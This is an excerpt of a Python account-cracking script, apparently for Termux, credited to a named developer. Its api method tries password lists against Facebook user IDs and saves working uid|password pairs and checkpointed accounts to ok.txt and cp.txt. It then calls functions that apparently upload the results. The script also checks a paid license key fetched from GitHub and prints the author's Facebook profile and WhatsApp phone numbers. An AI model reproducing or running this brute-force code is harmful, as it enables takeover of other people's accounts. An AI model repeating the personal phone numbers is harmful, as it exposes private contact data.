...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/sohail.wazir.547"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/sohail.wazir.547")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923130997378")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/love-sohail/premium/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m##     ## ##     ## ##     ## #### #### 
 ...
 > \033[0;92mDEVELOPER     : SOHAIL WAZIR
 > \033[0;95mFACEBOOK ID   :  Sohail Wazir
 > \033[0;41mWHATSAPP      : +923130997379
 \033[0;96m> LOVE YOU       : Friend
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SOHAIL-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [SOHAIL-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[SOHAIL-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SOHAIL-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
